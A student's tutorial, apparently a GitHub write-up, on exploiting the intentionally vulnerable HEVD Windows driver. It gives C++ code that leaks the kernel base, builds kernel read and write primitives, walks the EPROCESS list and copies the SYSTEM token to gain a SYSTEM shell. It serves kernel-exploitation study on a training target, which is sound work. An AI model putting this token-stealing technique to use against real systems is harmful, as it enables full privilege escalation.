# HEVD-Write-What-Where

 - #### Please note the this will depend on your target windows version, in my case, the token is at an offset of 0x4b8 from the base of EPROCESS of a specific process. (same goes for other objects)
 - #### I m student, I can make mistakes.
----
Today I will be explaining something i've been facing alot of issues with recently. A Write What Where vulnerability, Where I was able to escalate to administrator.

HEVD is a project that is an intentionally vulnerable driver created by the HackSys team to help security researchers, reverse engineers, and students learn kernel-level exploitation and vulnerability analysis.

And what i will be doing is exploiting that driver to show how a small bug could lead to a full system compromise as local administrator.

You can setup HEVD from the blog post only, i will not be showing how to install and configure it here.

## 0x00. Finding the vuln :

We have 2 options, we can look at the source code or reverse engineer, will be trying my best to show both here :

reversed :

```cpp
__int64 __fastcall TriggerArbitraryWrite(_WRITE_WHAT_WHERE *UserWriteWhatWhere)
{
  unsigned __int64 *What; // rbx
  unsigned __int64 *Where; // rdi

  ProbeForRead(Address: UserWriteWhatWhere, Length: 0x10u, Alignment: 1u);
  What = UserWriteWhatWhere->What;
  Where = UserWriteWhatWhere->Where;
  DbgPrintEx(ComponentId: 0x4Du, Level: 3u, Format: "[+] UserWriteWhatWhere: 0x%p\n", UserWriteWhatWhere);
  DbgPrintEx(ComponentId: 0x4Du, Level: 3u, Format: "[+] WRITE_WHAT_WHERE Size: 0x%X\n", 16);
  DbgPrintEx(ComponentId: 0x4Du, Level: 3u, Format: "[+] UserWriteWhatWhere->What: 0x%p\n", What);
  DbgPrintEx(ComponentId: 0x4Du, Level: 3u, Format: "[+] UserWriteWhatWhere->Where: 0x%p\n", Where);
  DbgPrintEx(ComponentId: 0x4Du, Level: 3u, Format: "[+] Triggering Arbitrary Write\n");
  *Where = *What;  <------ **Look here**
  return 0;
}
```

Source code :


```cpp
#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is properly validating if address
        // pointed by 'Where' and 'What' value resides in User mode by calling ProbeForRead()/
        // ProbeForWrite() routine before performing the write operation
        //

        ProbeForRead((PVOID)What, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR));
        ProbeForWrite((PVOID)Where, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR));

        *(Where) = *(What);
#else
        DbgPrint("[+] Triggering Arbitrary Write\n");

        //
        // Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability
        // because the developer is writing the value pointed by 'What' to memory location
        // pointed by 'Where' without properly validating if the values pointed by 'Where'
        // and 'What' resides in User mode
        //

        *(Where) = *(What);
```

In basic english, this means we can write what we want, where we want basically. While this sounds really simple, constructing the poc might be slightly harder.

Here is how we should approach such vulnerabilities :
1. Enumerate all drivers
2. Find the user and kernel mode base (one using EnumDeviceDrivers and the other using LoadLibraryExA)
3. Walk the processes to search for our and the SYSTEM's PID
4. Proceed to swap our tokens at a current offset of 0x4b8 (as per my windows build)

## 0x01. Phase 1 : EPROC in a nutshell

As per MSDN, an _EPROCESS is : The EPROCESS structure is an opaque structure that serves as the process object for a process.
It stand for Executive process and it's a fundemental kernel level structure that store everything about the process, but in the kernel.

You can image each process having it's own EPROCESS box, and each box stores information about the Process itself, In our case, we would be interested in the offsets of the objects we are interested in.
We need to note 3 things from the EPROCESS object :
1. The UniqueProcessId is at 0x440 from the EPROCESS base.
2. The Flink (Forward link) pointing to the ActiveProcessLink
3. The Token, which is located in 0x4b8

### To find the offsets in your Windows version, use the following windbg command :

```
dt nt!_EPROCESS
```


<img width="639" height="383" alt="image" src="https://github.com/user-attachments/assets/f0c9a2de-7f17-43e9-97af-4040830d332d" />


This is a visual representation that was made by the help of claude :

```
Kernel Memory
─────────────────────────────────────────────────────

0xFFFF8A00`12340000  ← EPROCESS for System (PID 4)
    +0x000  KPROCESS
    +0x440  UniqueProcessId = 0x4
    +0x448  ActiveProcessLinks.Flink = 0xFFFF8A00`23450448
    +0x4b8  Token = 0xFFFFCA8E`6B84C065   ← we want THIS value

                    │
                    │ flink points here
                    ▼
0xFFFF8A00`23450000  ← EPROCESS for cmd.exe (PID 3412)
    +0x000  KPROCESS
    +0x440  UniqueProcessId = 0xD54
    +0x448  ActiveProcessLinks.Flink = ...
    +0x4b8  Token = 0xFFFFCA8E`1234A031   ← we OVERWRITE this
```


For the last part of this phase, I will explain what RVA is.

**RVA** (Relative Virtual Address) :

An RVA is the offset of a symbol from its PE image's base address.
We can't read kernel addresses directly from user mode, so instead we:
1. Load ntoskrnl.exe into user space with `LoadLibraryExA`
2. Find `PsInitialSystemProcess` in that user-side copy and subtract the user-side module base to get the RVA
3. Add that same RVA to the real kernel base (from `EnumDeviceDrivers`) to get the live kernel address

`PsInitialSystemProcess` is a global pointer in ntoskrnl that holds the address of the SYSTEM EPROCESS.
Dereferencing it gives us the base of SYSTEM's EPROCESS structure, which is our starting point for the process walk.
Here how it will look like (we will expand on this) 

```cpp
// Getting the real kernel base
EnumDeviceDrivers(drivers, sizeof(drivers), &needed);
uint64_t kbase = (uint64_t)drivers[0];  

// get RVA of PsInitialSystemProcess
HMODULE h = LoadLibraryExA("ntoskrnl.exe", ...);
uint64_t rva = (uint64_t)GetProcAddress(h, "PsInitialSystemProcess") 
               - (uint64_t)h;                 

uint64_t psi = kbase + rva;                     // real kernel address
```


## 0x02. Phase 2 : Developing the exploit

The first step to actually contact a driver is to :
1. Create a handle that will hold the driver's name
2. Find the IOCTL code
3. Prepare input buffer
4. Send buffer using the API : DeviceIoControl

Here is what creating a handle looks like in MSDN

<img width="616" height="332" alt="image" src="https://github.com/user-attachments/assets/760cb318-067c-4bdd-b2e1-64634526e6a8" />

Incase you are facing any issues with understanding the parameters, you can scroll further to see to see what each parameter takes :

<img width="653" height="602" alt="image" src="https://github.com/user-attachments/assets/ab47a102-19cb-4b57-8bda-5dd016fbcc91" />

And here is how it will look like for our poc

```cpp
// Please remember to include the library fileapi.h.

hDevice = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0x00,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
```

With some error handling, we will confirm that the driver was actually loaded :

<img width="574" height="383" alt="image" src="https://github.com/user-attachments/assets/7fc25519-ff93-4878-8536-f816c229c97f" />
<img width="320" height="83" alt="image" src="https://github.com/user-attachments/assets/6afe41f7-ccd0-44b6-af8c-fb49a742041c" />


Now that we have that, let's move on to getting the kernel bases.

## 0x03. Phase 3 : Getting kernel bases 

1 Important API is EnumDeviceDrivers, this will help us get the actual kernel base and use it to our advantage to proceed with our plan.

Here is how it looks like, u can also refer to MSDN's documentation about it incase it's not clear :

```cpp
	LPVOID drivers[1024];
	DWORD cb;
	BOOL enumDevice = EnumDeviceDrivers(drivers, sizeof(drivers), &cb);
	printf("\n[+] address of base     : 0x%p", drivers[0]);
```

We now officially have the kernel base. This works because `EnumDeviceDrivers` is a documented Windows API
that leaks kernel module base addresses to any user-mode caller — an ASLR information disclosure
via a legitimately exposed API, rather than an exploit bypass.

On top of Getting the kernel base, we need 2 really important and crucial functions, a kernel read and write function, These will help us swap tokens and read them.

```cpp
uint64_t KernelRead(uint64_t addr) {
	uint64_t out = 0;
	uint64_t pkt[2] = { addr, (uint64_t)&out };
	DWORD br;
	DeviceIoControl(hDevice, IOCTL_CODE, pkt, 16, 0, 0, &br, NULL);
	return out;
}
```

Don't let this intimidate you, but all what this function does is read the address of the function/variable you give it : 
- a variable that will hold values from output (the out var).
- an address read variable (pkt)
- "Bytes returned" for DeviceIoControl
- Return out. (the var that will hold address/output)


and it will be almost the same for the KernelWrite, just that we will not need to store output :

```cpp
void KernelWrite(uint64_t src, uint64_t dst) {
	uint64_t pkt[2] = { src, dst };
	DWORD br;
	DeviceIoControl(hDevice, IOCTL_CODE, pkt, 16, 0, 0, &br, 0);
}
```

Now that's over, let's get the EPROCESS and walk the process list.

## 0x04. Phase 4 : Walking in no man's land

We use LoadLibraryExA to load ntoskrnl.exe to usermode to find the rva.
This will be used to find the REAL kernel base, which we will be able to extract the sysEproc from.

```cpp
uint64_t GetPsiPtr(uint64_t kbase) { // Find what LoadLibraryExA Does exactly
	HMODULE h = LoadLibraryExA(
		"C:\\Windows\\System32\\ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!h) {
		printf("[-] h Device Failed to be loaded. Error : %d", GetLastError());
	}
	uint64_t rva = (uint64_t)GetProcAddress(h, "PsInitialSystemProcess") - (uint64_t)h;
	FreeLibrary(h);
	return kbase + rva;
}
```
Again, GetPsiPtr is just a function name, LoadLibraryExA is windows API documented by MSDN which needs to be freed (FreeLibrary(h)), RVA is what we explained above. ntoskernel is the core kernel image for windows.

Once we have everything set, all we have to do now is walk the process list and setup some vars to spawn a system shell.

```cpp
	uint64_t psiPtr = GetPsiPtr(kbase);
	uint64_t sysEproc = KernelRead(psiPtr);
	printf("[+] SYSTEM eproc: 0x%llX\n", sysEproc);
	DWORD myPid = GetCurrentProcessId();
	uint64_t flink = KernelRead(sysEproc+0x448);
	uint64_t start = flink;
	uint64_t myEproc = 0;

	while (1) {
		uint64_t eproc = flink - 0x448;
		uint64_t pid = KernelRead(eproc + 0x440);

		if((DWORD)pid == myPid){
			myEproc = eproc;
			break;
		}
		flink = KernelRead(flink);
		if (flink == start) {
			printf("\n[-] Not found.");
			return 1;
		}

	}
	printf("[+] My eproc		: 0x%llX\n", myEproc);
```

I know I just threw alot of stuff but let's break it down : 

```cpp
	uint64_t psiPtr = GetPsiPtr(kbase);
	uint64_t sysEproc = KernelRead(psiPtr);
	printf("[+] SYSTEM eproc: 0x%llX\n", sysEproc);
```
This is to get the SYSTEM EPROC using PsInitialSystemProcess as we talked about earlier. We will now need to **look for our own PID to swap the system's with ours**.

```cpp
	DWORD myPid = GetCurrentProcessId();
	uint64_t flink = KernelRead(sysEproc+0x448);
	uint64_t start = flink;
	uint64_t myEproc = 0;
```
From what we talked about earlier, the flink is at 0x448, and we are going to set a variable (myEproc) to zero as a standby variable to hold values we are going to need for the while loop.
The while loop will cycle through the whole process list in an attempt to find our PID, then get it's base.

Look at commnets in the code below :
```cpp
	while (1) {
		uint64_t eproc = flink - 0x448; // setting eproc to base EPROCESS address
		uint64_t pid = KernelRead(eproc + 0x440); // setting pid to eproc which is at base to 0x440 which is the UniqueProecessId

		if((DWORD)pid == myPid){ // if the pid var above is equal to the on this one "DWORD myPid = GetCurrentProcessId();", set the address of that to the standby variable.
			myEproc = eproc;
			break;
		}
		flink = KernelRead(flink);
		if (flink == start) {// Flink has circled back to the start. Full list has been walked, process not found.
			printf("\n[-] Not found.");
			return 1;
		}

	}
	printf("[+] My eproc		: 0x%llX\n", myEproc);
```

Basically, we will get the current process ID (PID), then flink will be pointed to the Active Process Links table.
After that, we will create loop to look for our cmd.exe process in memory so we can write the SYSTEM token to our process. If myPid (our pid) is equal to  the UPID (Unique), then, myEproc (cmd) will hold the base EPROCESS address.

And then finally, we will use our KernelWrite function to copy the SYSTEM process token into our own process's token field.
`KernelWrite` reads from `sysEproc + 0x4b8` (SYSTEM's token) and writes it to `myEproc + 0x4b8` (our token),
giving our process SYSTEM-level privileges and spawning an interactive NT AUTHORITY\SYSTEM shell: 

<img width="1083" height="573" alt="image" src="https://github.com/user-attachments/assets/229e8a4f-0b89-435a-8dfe-757e247e808f" />

> **Note:** `EPROCESS+0x4b8` is an `EX_FAST_REF` structure — the low 4 bits of the value are used
> internally as a reference count, not part of the pointer. A raw copy works in practice because
> the reference count is small and the kernel accepts the slightly dirty value. A cleaner approach
> (used in shellcode-based token steals) masks those bits off first: `token & ~0xF`.


That's all for this time. You can reach out in anyway and I will try my best to help. 
